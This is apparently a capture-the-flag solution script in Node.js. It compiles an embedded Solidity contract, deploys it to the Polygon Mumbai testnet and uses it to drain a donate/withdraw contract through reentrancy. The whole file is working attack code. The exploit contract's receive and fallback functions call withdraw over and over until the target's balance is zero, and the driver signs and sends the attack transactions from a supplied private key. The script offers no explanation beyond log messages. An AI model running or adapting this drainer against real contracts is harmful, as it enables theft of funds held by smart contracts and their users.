const Web3 = require('web3');
const web3 = new Web3('https://matic-mumbai.chainstacklabs.com');
const solc = require('solc');

const contractAbi = [{"inputs":[{"internalType":"address","name":"_who","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x70a08231"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x27e235e3"},{"inputs":[{"internalType":"address","name":"_to","type":"address"}],"name":"donate","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0x00362a95"},{"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0x2e1a7d4d"},{"stateMutability":"payable","type":"receive","payable":true}];

const exploitCode = `
pragma solidity 0.8.19;

interface IWithdraw {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract Exploit {
    function exploit(address payable _target) public payable returns (uint) {
        IWithdraw(_target).donate{value: msg.value}(address(this));

        IWithdraw(_target).withdraw(msg.value);

        return address(this).balance;
    }

    receive() external payable {
        address target = msg.sender;

        if (target.balance > 0) {
            if (target.balance >= msg.value) {
                IWithdraw(target).withdraw(msg.value);
            } else {
                IWithdraw(target).withdraw(target.balance);
            }
        }
    }

    fallback() external payable {
        address target = msg.sender;

        if (target.balance > 0) {
            if (target.balance >= msg.value) {
                IWithdraw(target).withdraw(msg.value);
            } else {
                IWithdraw(target).withdraw(target.balance);
            }
        }
    }
}
`;
 
const input = {
    language: 'Solidity',
    sources: {
        'Exploit.sol': {
            content: exploitCode,
        },
    },
    settings: {
        outputSelection: {
            '*': {
                '*': ['*'],
            },
        },
    },
};

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new web3.eth.Contract(contractAbi, contractAddress);
    const account = web3.eth.accounts.privateKeyToAccount(privateKey);

    if (await solved(contract)) {
        console.log('contract already pwned');
        process.exit(0);
    }

    console.log('compiling exploit contract...');
    const compiler = await (new Promise((resolve, reject) => {
        solc.loadRemoteVersion('v0.8.19+commit.7dd6d404', (err, solc) => {
            if (err) {
                reject(err);
                return;
            }
            resolve(solc);
        });
    }));
    const compilerOutput = JSON.parse(compiler.compile(JSON.stringify(input)));
    const exploitAbi = compilerOutput.contracts['Exploit.sol'].Exploit.abi;
    const exploitBytecode = compilerOutput.contracts['Exploit.sol'].Exploit.evm.bytecode.object;

    const balance = await web3.eth.getBalance(contract.options.address);
    console.log(`contract balance: ${web3.utils.fromWei(balance, 'ether')} eth`);

    console.log('deploying exploit contract...');
    const exploitContract = new web3.eth.Contract(exploitAbi);
    const tx = exploitContract.deploy({
        data: exploitBytecode,
    });
    const txOpts = {
        data: tx.encodeABI(),
        gas: await tx.estimateGas(),
        gasPrice: await web3.eth.getGasPrice(),
    };
    const signedTx = await web3.eth.accounts.signTransaction(txOpts, privateKey);
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    
    const exploitInstance = new web3.eth.Contract(exploitAbi, receipt.contractAddress);
    const attackAmount = balance / 10;
    const exploitTx = await exploitInstance.methods.exploit(contractAddress);
    const exploitTxOpts = {
        data: exploitTx.encodeABI(),
        to: exploitInstance.options.address,
        gas: await tx.estimateGas(),
        gasPrice: await web3.eth.getGasPrice(),
        value: attackAmount,
    };
    const signedExploitTx = await web3.eth.accounts.signTransaction(exploitTxOpts, privateKey);
    await web3.eth.sendSignedTransaction(signedExploitTx.rawTransaction);

    const newBalance = await web3.eth.getBalance(contract.options.address);
    console.log(`new contract balance: ${web3.utils.fromWei(newBalance, 'ether')} eth`);

    if (await solved(contract)) {
        console.log('solved!');
    } else {
        console.log('could not withdraw all of the resources. Something happened');
        process.exit(1);
    }
}

async function solved(contract) {
    return (await web3.eth.getBalance(contract.options.address)) == 0;
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as the first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as the second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
